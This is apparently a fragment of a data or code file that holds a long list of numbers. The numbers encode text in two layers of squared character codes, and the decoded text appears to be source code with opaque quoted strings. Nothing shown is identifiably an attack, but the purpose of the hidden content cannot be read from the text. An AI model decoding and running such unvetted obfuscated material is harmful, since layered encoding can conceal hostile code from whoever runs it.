04,2704,1936,2401,2401,2809,2916,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2500,3136,2304,3249,1936,3249,2916,2304,2704,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2704,2916,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2304,2704,2401,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2304,3136,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,2401,2704,2704,2704,1936,2401,2704,2704,2704,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,3136,3249,1936,2401,2916,2304,2304,1936,3249,2304,2500,2809,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2601,2500,2704,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,2401,2704,2401,2916,2401,1936,2809,2304,2704,2401,1936,2601,2401,2601,2916,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2401,2500,3249,3249,2916,1936,2916,3136,3136,3249,1936,2401,2401,2704,2704,3249,1936,3249,2304,2500,2809,1936,2401,2304,3136,2401,2916,1936,2401,2401,2704,2704,3249,1936,2401,2500,3249,3249,2916,1936,3249,2304,2500,2809,1936,2401,2401,2500,2601,2916,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2916,2704,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2704,2704,2704,1936,2401,2704,2704,2704,1936,2401,2304,2500,2704,1936,2401,2304,3136,3249,1936,2401,2916,2304,2304,1936,2401,2916,2304,2304,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2916,2304,3249,1936,3025,2500,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2601,2500,2704,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,2401,2704,2401,2916,2401,1936,2809,2304,2704,2401,1936,2601,2401,2601,2916,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2401,2500,3249,3249,2916,1936,2916,3136,3136,3249,1936,2401,2401,2704,2704,3249,1936,3249,2304,2500,2809,1936,2401,2304,3136,2401,2916,1936,2401,2401,2704,2704,3249,1936,2401,2500,3249,3249,2916,1936,3249,2304,2500,2809,1936,2401,2401,2704,2704,3249,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2916,2704,2304,2304,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,3025,2601,3249,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,3136,2500,3136,2401,1936,3136,2916,2704,3249,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2401,2809,2916,2500,2809,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,2916,2304,2704,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2601,2500,2704,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2304,2500,2704,1936,2401,2601,2916,3249,1936,3025,3025,2704,2704,1936,2401,2304,2500,2704,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2304,2304,2304,2304,1936,3025,2809,2916,3249,1936,2601,2304,2500,2809,1936,2401,2304,2500,2704,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2304,2500,2704,1936,2401,2401,2704,2704,3249,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2401,2304,3136,3249,1936,2401,2304,2500,2704,1936,2500,2916,2304,2401,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2401,2704,2401,2916,2401,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2916,3025,2500,2704,1936,2401,2601,2916,3136,3249,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2401,2500,2809,2704,2704,1936,3025,2809,2916,3249,1936,2704,2916,2500,2704,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2500,2401,2401,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2601,2401,2601,2916,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,3136,2916,2704,3249,1936,3136,2916,2704,3249,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,3025,2809,2916,3249,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2401,2704,2704,3249,1936,2500,2601,2304,2704,1936,2916,3025,2500,2704,1936,2704,2916,2500,2704,1936,2401,2500,3249,3249,2916,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2704,2916,2500,2704,1936,3025,2809,2916,3249,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2401,2601,2500,2500,2809,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2500,2601,2500,2401,1936,2500,2601,2304,2704,1936,2401,2304,2304,2304,2304,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2601,2809,2916,1936,2401,2704,2401,2916,2401,1936,2401,2401,3136,3136,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2809,3025,3025,2916,1936,2500,2601,2304,2704,1936,2601,2500,2704,3249,1936,2809,2304,2704,2401,1936,2809,2401,3136,2704,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2500,2601,2304,2704,1936,2809,2401,3136,2704,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2500,2601,2304,2704,1936,2401,2704,2916,2704,2401,1936,2916,3025,2500,2704,1936,2704,2601,2809,2916,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2500,2601,2304,2704,1936,2809,2304,2704,2401,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2304,3136,3249,1936,2401,2916,2304,2304,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2704,2500,2500,2809,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2916,2304,3249,1936,3025,2500,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,2500,3249,2401,2916,1936,2500,3249,2401,2916,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2916,2809,2916,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,3249,3136,2304,2401,1936,3249,3136,2304,2401,1936,2809,2601,2500,3249,1936,2401,2601,3249,2500,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2500,3249,2401,2916,1936,3249,3136,2304,2401,1936,2500,3249,2401,2916,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2916,2809,2916,2401,1936,2500,3249,2401,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2500,3249,2401,2916,1936,2500,3025,2304,2704,1936,2809,2601,2500,3249,1936,2401,2401,2916,2916,2704,1936,2401,2601,3249,2500,2704,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2809,2601,2500,3249,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2401,2916,2916,2704,1936,2809,2601,2500,3249,1936,2401,2401,2916,2916,2704,1936,2401,2601,2500,2500,2809,1936,2916,2809,2916,2401,1936,2401,2601,2500,2500,2809,1936,2401,2601,2500,2500,2809,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2809,2601,2500,3249,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2304,2500,2304,2401,1936,2500,3025,2304,2704,1936,3249,3136,2304,2401,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2500,3249,2401,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,324